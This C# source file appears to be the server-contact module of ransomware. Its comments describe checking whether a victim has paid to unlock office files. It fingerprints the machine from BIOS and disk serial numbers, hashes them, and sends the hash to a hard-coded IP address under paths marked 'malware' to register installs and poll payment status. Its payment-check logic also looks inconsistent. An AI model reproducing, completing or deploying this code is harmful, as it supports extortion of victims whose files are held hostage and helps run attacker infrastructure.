using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Net;
using System.IO;
using System.Windows.Forms;
using System.Management;
using System.Collections.Specialized;

namespace Instruments
{
    public class WebOperations
    {
        /// <summary>
        /// Проверка оплаты пользователя, для разблокировки офисных файлов
        /// </summary>
        /// <returns>true - если оплата произошла\n
        /// false - если оплаты нет или произогла ошибка</returns>
        public static bool CheckPayment()
        {
            String uri = "http://188.127.239.96/bdz42/api/malware/" + MD5(GetSerialNumber());
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            if (response.StatusCode != HttpStatusCode.OK)
            {
                MessageBox.Show("No internet connection");
                return false;
            }
            String result = "";
            using (Stream stream = response.GetResponseStream())
            {
                using (StreamReader streamReader = new StreamReader(stream))
                {
                    result += streamReader.ReadToEnd();
                }
            }
            if (String.IsNullOrEmpty(result) || result != "\"-1\"")
            {
                return false;
            }
            return true;
        }
        /// <summary>
        /// Проверка оплаты пользователя, для разблокировки офисных файлов
        /// </summary>
        /// <returns>true - если оплата произошла\n
        /// false - если оплаты нет или произогла ошибка</returns>
        public static int GetId()
        {
            String uri = "http://188.127.239.96/bdz42/api/v1/malware/" + MD5(GetSerialNumber());
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            if (response.StatusCode != HttpStatusCode.OK)
            {
                MessageBox.Show("No internet connection");
                return -2;
            }
            String result = "";
            using (Stream stream = response.GetResponseStream())
            {
                using (StreamReader streamReader = new StreamReader(stream))
                {
                    result += streamReader.ReadToEnd();
                }
            }
            if (String.IsNullOrEmpty(result) || result != "\"-1\"")
            {
                return -1;
            }
            try
            {
                var iResult = int.Parse(result);
                return iResult;
            }
            catch
            {
                MessageBox.Show("Internal error. Try again");
                return -2;
            }
        }
        /// <summary>
        /// Получения MD5 хэша от строки (Серийный номер Windows + Серийный номер HDD)
        /// </summary>
        /// <returns>MD5 от (Серийный номер Windows + Серийный номер HDD)</returns>
        public static string GetSerialNumber()
        {
            string res = "";
            var query = new SelectQuery("select * from Win32_Bios");
            var search = new ManagementObjectSearcher(query);
            foreach (ManagementBaseObject item in search.Get())
            {
                string serial = item["SerialNumber"] as string;
                if (serial != null)
                    res += serial;
            }
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMedia");
            foreach (ManagementObject hdd in searcher.Get())
            {
                //Console.WriteLine(hdd["SerialNumber"]);
                string hdd_id = hdd["SerialNumber"] as string;
                if (hdd_id != null)
                    res += hdd_id;
            }

            return MD5(res);
        }
        /// <summary>
        /// Получение MD5 от строки
        /// </summary>
        /// <param name="input">Исходная строка</param>
        /// <returns>MD5 от строки</returns>
        public static string MD5(string input)
        {
            // step 1, calculate MD5 hash from input
            MD5 md5 = System.Security.Cryptography.MD5.Create();
            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
            byte[] hash = md5.ComputeHash(inputBytes);

            // step 2, convert byte array to hex string
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < hash.Length; i++)
            {
                sb.Append(hash[i].ToString("X2"));
               
            }
            return sb.ToString();
        }

        public static Boolean SetInstalled()
        {
                String hash  = MD5(GetSerialNumber());
                //send POST request to playsense.ru
                using (WebClient client = new WebClient())
                {
                    try
                    {
                        byte[] response =
                            client.UploadValues("http://188.127.239.96/bdz42/api/v1/malware/",
                            new NameValueCollection()
                            {
                                { "hash", hash}
                            }
                        );

                        string result = System.Text.Encoding.UTF8.GetString(response);
                        //Console.WriteLine(result);
                        if (result == "true"/*"hash=" + hash*/ ) return true;
                        return false;
                    }
                    catch
                    {
                        return false;
                    }
                }
            

        }

    }
}
